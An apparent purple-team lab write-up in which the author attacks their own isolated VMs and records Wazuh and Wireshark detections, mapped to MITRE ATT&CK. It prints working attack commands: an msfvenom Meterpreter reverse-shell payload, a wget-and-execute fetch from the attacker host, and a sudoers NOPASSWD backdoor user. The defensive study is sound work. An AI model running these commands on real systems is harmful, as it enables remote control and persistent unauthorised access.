#  PurpleOps-Playground — Blue Team Play-by-Play(Red Team Simulated Attack by me)

**Author:** Bobo Nikolov  
**Project:** PurpleOps-Playground  
**Date:** 27-10-2025  
**Status:** Completed

---

## Overview

**Goal:** Build an isolated attacker ↔ victim lab to demonstrate reconnaissance, initial access, execution, persistence, and privilege escalation — then integrate a defender stack (SecurityOnion planned; Wazuh and Wireshark used here) to capture telemetry and author detection content.

**Defender viewpoint:** This README is written as a *play-by-play* defender report — what I observed, what alerts were generated (Wazuh), what network artifacts were captured (Wireshark PCAPs), and where detection gaps exist.

**Important notes:**
- The lab was isolated (host-only / internal), and virtual machine snapshots were taken before testing and reverted afterwards to ensure reproducibility.
- All activity occurred on my own VMs only.

---

## Lab architecture & scope

- **lab_attacker** — Kali Linux  
  - IP: `10.10.10.10` (labnet)
  - Tools: `msfvenom`, `msfconsole` / `exploit/multi/handler`, `python3 -m http.server`, `nmap`
- **lab_victim** — Ubuntu Desktop (target)  
  - IP: `10.10.10.20` (labnet / intnet)
  - Tools: `wget`, `chmod`, `bash`, `sudo`. Wazuh agent installed and logging; Wireshark capturing on the victim.
- **Network:** Isolated internal network (no internet). Snapshots taken.
- **Evidence storage (local):** `Projects/PurpelOps-playground/Screenshots/` (screenshots, pcaps, Wazuh alerts)
- **Scope:** Single-host attack chain (recon → initial access → execution → persistence → privilege escalation). Defender proof-of-concept detections from Wazuh & pcap analysis.

---

## MITRE ATT&CK mapping (defender play-by-play)

Below is the mapping used in this lab. Each tactic is followed by the specific technique(s) observed and defender notes.

- **Reconnaissance — T1595 (Active Scanning / Nmap)**  
  Observed: `nmap -sS -sV 10.10.10.20` — large SYN sweep and service probes.  
  Defender notes: Suricata/Zeek / Wazuh rule can detect unusual scanning behavior.

- **Resource Development — T1587**  
  Observed: Payload created locally (msfvenom); not network-visible except when served.  
  Defender notes: Artifact: ELF binary created on attacker. Monitor known msfvenom patterns on dev hosts.

- **Initial Access — T1190 / T1204**  
  Observed: HTTP fetch of ELF payload and manual execution (`wget ... && chmod +x ... && /tmp/shell`).  
  Defender notes: Detect/alert on `wget`/`curl` + immediate execute flows, unexpected HTTP egress to odd hosts.

- **Execution — T1059 + T1110 + T1190 (includes brute-force and SQLi attempts)**  
  Observed: Meterpreter reverse shell execution, attempted brute-force, attempted SQLi (payloads in HTTP requests).  
  Defender notes: Look for abnormal command sequences, unusual shells, `chmod` followed by execution, database query anomalies.

- **Persistence — T1136 / T1547**  
  Observed: Created user `backdoor_user` and added sudoers NOPASSWD entry.  
  Defender notes: Monitor `/etc/sudoers.d` additions, user creation events.

- **Privilege Escalation — T1068 / T1548**  
  Observed: Verified root via `sudo /bin/bash` or `whoami` from interactive session.  
  Defender notes: Alert on suspicious use of `sudo` or escalation sequences when preceded by unknown agent activity.

- **Defense Evasion — T1562**  
  Observed: Minimal attempts; some logging gaps observed (Wazuh missed certain file-download events).  
  Defender notes: Improve host instrumentation; add auditd/Sysmon-like logging for file creations in `/tmp`.

- **Credential Access — T1110**  
  Observed: Attempted brute-force (logged by Wireshark and Wazuh summary).  
  Defender notes: Enforce rate-limits and lockouts; log and alert failed auth spikes.

- **Discovery — T1087 / T1083**  
  Observed: Target enumeration post-compromise (limited).  
  Defender notes: Host-level discovery should emit process creation logs.

- **Command & Control — T1071**  
  Observed: Meterpreter reverse TCP established back to attacker `10.10.10.10:4444`.  
  Defender notes: Monitor reverse TCP beaconing to internal hosts / unexpected IPs.

- **Exfiltration — T1041**  
  Observed: Not performed in this run (file transfer from victim-to-attacker via meterpreter occurred but some detection missed it).  
  Defender notes: Instrument endpoint to detect outbound file transfer commands and large data flows.

---

## Phase-by-phase (defender viewpoint)

Below I walk through each phase, show what I (the defender) observed in Wazuh / Wireshark / host logs, list artifacts, and propose detection rules or mitigations.

---

### Reconnaissance (T1595)

**Attacker activity**
```bash
nmap -sV 10.10.10.20 (Deliberately didn't use -sS option so I will be able to fully see the TCP handshake)
```

**Defender findings**

Wazuh Artifacts:

![Enumeration](Projects/PurpleOps-playground/Screenshots/Screenshots/Recon/Wazuh/2025-11-06_22-28-54_Recon(nmap)_Enumeration.png)

![Enumeration](Projects/PurpleOps-playground/Screenshots/Screenshots/Recon/Wazuh/2025-11-06_22-29-00_Nmap-Recon_Enumeration_Wazuh.png)

![Enumeration](Projects/PurpleOps-playground/Screenshots/Screenshots/Recon/Wazuh/2025-11-06_22-28-54_Nmap_Wazuh.png)

Wazuh: Rule 31101 triggered (Web Server 400 Error) triggered by nmap scripting. 

---

Wireshark Artifacts:

![Enumeration](Projects/PurpleOps-playground/Screenshots/Screenshots/Recon/Wireshark/2025-11-06_22-29-00_Nmap-Recon_Wireshark.png)

Wireshark: TCP SYN flood from 10.10.10.10 to 10.10.10.20.

---

### Initial Access(T1190/T1204) 

**Attacker Activity**
```bash
# Attacker
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell32.elf
python3 -m http.server 8000 --bind 10.10.10.10

# Victim
wget http://10.10.10.10:8000/shell32.elf -O /tmp/shell && chmod +x /tmp/shell
```

**Defender Findings**

Wireshark Artifacts:

![Initial Access](Projects/PurpleOps-playground/Screenshots/Screenshots/Initial-Access/Wireshark/2025-11-06_22-40-55_Initial-Access_Unknown-File-Downloaded.png)

Wiresark: HTTP GET /shell32.elf, binary ELF transfer detected.

Defender Note: Wazuh didn't capture the wget or file downloaded.

---

### Execution(T1059/T1110/T1190)

**Attacker Activity**

Attempted SQL Injections(Harmless)

```bash
curl -XGET "http://10.10.10.20/users/?id=SELECT+*+FROM+users";
```

Attempted Brute Force Attack using Metasploit

```bash
use linux/http/netgear_wnr2000_rce 
```

Payload Execution(Victim)
```bash
./shell
```

**Defender Findings**

Wazuh SQLI Artifacts:

![Execution](Projects/PurpleOps-playground/Screenshots/Screenshots/Execution/Wazuh/2025-11-06_22-31-25_Attempted-SQLInjection-Wazuh.png)

Wazuh: Web log anomaly (possible injection attempt)

Wireshark SQLI Artifacts:

![Execution](Projects/PurpleOps-playground/Screenshots/Screenshots/Execution/Wireshark/2025-11-06_22-39-25_Attempted-SQLInjection-Wireshark.png)

Wireshark: Unusual HTTP payload patterns in POST request.

Wazuh Brute Force Artifacts:

![Execution](Projects/PurpleOps-playground/Screenshots/Screenshots/Execution/Wazuh/2025-11-06_22-40-13_Attempted-Brute-Force-Attack_Wazuh_Overview.png)

Wazuh: Multiple failed authentication alerts.

Wireshark Brute Force Artifacts:

![Execution](Projects/PurpleOps-playground/Screenshots/Screenshots/Execution/Wireshark/2025-11-06_22-40-13_Attempted-Brute-Force-Attack_Wireshark_Overview.png)

Wireshark: Identical POST login attempts observed.

Wazuh Payload Execution: No explicit alert(missed correlation).

Wireshark Payload Execution Artifacts:

![Execution](Projects/PurpleOps-playground/Screenshots/Screenshots/Execution/Wireshark/2025-11-06_22-41-59_File-Executed.png)

Wireshark: Reverse TCP handshake detected right after downloading the file. Attacker port:4444

---

### Persistance(T1136/T1547)

**Attacker Activity**

```bash
sudo useradd -m -s /bin/bash backdoor_user
echo "backdoor_user ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/backdoor_user
```

**Defender Findings**

Wazuh Artifacts:

Backdoor_User Created:

  ![Persistance](Projects/PurpleOps-playground/Screenshots/Screenshots/Persistance/Wazuh/2025-11-06_22-45-07_Persistance_Backdoor-User-Created.png)

  ![Persistance](Projects/PurpleOps-playground/Screenshots/Screenshots/Persistance/Wazuh/2025-11-06_22-45-43_Persistance_Backdoor-User-Added.png)

Password rules changed New user can use sudo always and will never be asked for a password

  ![Persistance](Projects/PurpleOps-playground/Screenshots/Screenshots/Persistance/Wazuh/2025-11-06_22-49-17_Persistance_Password-Changed.png)

New User was added to sudoers:

  ![Persistance](Projects/PurpleOps-playground/Screenshots/Screenshots/Persistance/Wazuh/2025-11-06_22-50-19_Persistance_Added-New-User-Sudoers.png)

Backdoor user is officially unremovable:

  ![Persistance](Projects/PurpleOps-playground/Screenshots/Screenshots/Persistance/Wazuh/2025-11-06_22-50-41_Persistance_Updated-Privileges-For-Backdoor_User.png)

Wazuh: Detected new sudoers file creation.

---

### Privilege Escalation(T1068/T1548)

**Attacker Activity**

```bash
sudo /bin/bash
```

**Defender Findings**

Wazuh Artifacts:

![Privilege Escalation](Projects/PurpleOps-playground/Screenshots/Screenshots/Privilege-Escalation/Wazuh/2025-11-06_22-43-06_Privilege-Escalation.png)

Wazuh:Alert-"Non-standard sudo shell spawned".

---

### Defense Evasion(T1562)

**Findings**
-The ELF download escaped detection; correlation between network and host was missing.
-No alert for file transfer despite visible HTTP GET in Wireshark.

**Mitigation Plan**
-Add Auditd rule for execve syscalls targeting/tmp/ directory.
-Enforce time sync between Wazuh agent and Wireshark capture host.

---

### Credential Access(T1110/T1552)

**Status**
-Not directly simulated. Used brute force just for fun in Execution.

---

### Discovery

Not part of current lab setup.

---

### Lateral Movement

Not part of the current lab set up. In next phase I will be using Autoroute and Socks.

---

### Command and Control(T1071)

**Attacker Activity**

Meterpreter reverse TCP established.

**Defender Findings**

Persistent TCP stream from 10.10.10.20 to 10.10.10.10:4444

**Defender notes**
No Wazuh detection;network alert required.

---

### Exfiltration(T1041)

**Observation**
-File downloaded from victim to attacker via meterpreter.
-No Wazuh detection, Wireshark recorded transfer partialy.

**Defender notes**
-Add rule for abnormal outbound transfer size to non-whitelisted hosts.

---

### Impact(T1489)

-No destructive action performed in this lab. This step intentionally skipped for system safety.

---

### Detection and Response

|Category|Finding|Detection Source|Status|
|:-------:--------:---------------:------|
|Recon|Nmap Scan|Wazuh, Wireshark|Success|
|Initial Access|Elf download|Wireshark|Partial|

|








